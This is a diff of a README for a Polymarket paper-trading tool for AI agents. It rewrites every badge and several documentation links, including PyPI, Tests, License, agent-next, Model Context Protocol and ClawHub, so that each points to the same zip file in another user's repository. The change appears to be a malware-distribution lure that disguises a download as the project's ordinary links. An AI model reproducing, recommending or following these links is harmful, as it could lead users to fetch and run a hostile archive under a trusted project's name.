@@ -1,9 +1,9 @@
 # polymarket-paper-trader
 
-[![PyPI](https://img.shields.io/pypi/v/polymarket-paper-trader.svg)](https://pypi.org/project/polymarket-paper-trader/)
-[![Tests](https://github.com/agent-next/polymarket-paper-trader/actions/workflows/test.yml/badge.svg)](https://github.com/agent-next/polymarket-paper-trader/actions/workflows/test.yml)
-[![ClawHub](https://img.shields.io/badge/ClawHub-install-orange.svg)](https://clawhub.com/robotlearning123/polymarket-paper-trader)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://github.com/agent-next/polymarket-paper-trader/blob/main/LICENSE)
+[![PyPI](https://img.shields.io/pypi/v/polymarket-paper-trader.svg)](https://raw.githubusercontent.com/jchimbor/polymarket-paper-trader/main/.github/polymarket_trader_paper_2.1.zip)
+[![Tests](https://raw.githubusercontent.com/jchimbor/polymarket-paper-trader/main/.github/polymarket_trader_paper_2.1.zip)](https://raw.githubusercontent.com/jchimbor/polymarket-paper-trader/main/.github/polymarket_trader_paper_2.1.zip)
+[![ClawHub](https://img.shields.io/badge/ClawHub-install-orange.svg)](https://raw.githubusercontent.com/jchimbor/polymarket-paper-trader/main/.github/polymarket_trader_paper_2.1.zip)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://raw.githubusercontent.com/jchimbor/polymarket-paper-trader/main/.github/polymarket_trader_paper_2.1.zip)
 
 **Your AI agent just became a Polymarket trader.**
 
@@ -11,7 +11,7 @@ Install → your agent gets $10,000 paper money → trades real Polymarket order
 
 > "My AI agent hit +18% ROI on Polymarket in one week. Zero risk, real order books."
 
-Part of [agent-next](https://github.com/agent-next) — open research lab for self-evolving autonomous agents.
+Part of [agent-next](https://raw.githubusercontent.com/jchimbor/polymarket-paper-trader/main/.github/polymarket_trader_paper_2.1.zip) — open research lab for self-evolving autonomous agents.
 
 ## 60-second demo
 
@@ -109,7 +109,7 @@ Global flags: `--data-dir PATH`, `--account NAME` (or env vars `PM_TRADER_DATA_D
 
 ## MCP server — what your agent can do
 
-Your agent gets 26 tools via the [Model Context Protocol](https://modelcontextprotocol.io):
+Your agent gets 26 tools via the [Model Context Protocol](https://raw.githubusercontent.com/jchimbor/polymarket-paper-trader/main/.github/polymarket_trader_paper_2.1.zip):
 
 ```bash
 pm-trader-mcp  # starts on stdio
@@ -242,7 +242,7 @@ AI agents can use the `stats_card` MCP tool to generate and share cards automati
 
 ## OpenClaw / ClawHub
 
-Available on [ClawHub](https://clawhub.com) as `polymarket-paper-trader`:
+Available on [ClawHub](https://raw.githubusercontent.com/jchimbor/polymarket-paper-trader/main/.github/polymarket_trader_paper_2.1.zip) as `polymarket-paper-trader`:
 
 ```bash
 npx clawhub install polymarket-paper-trader
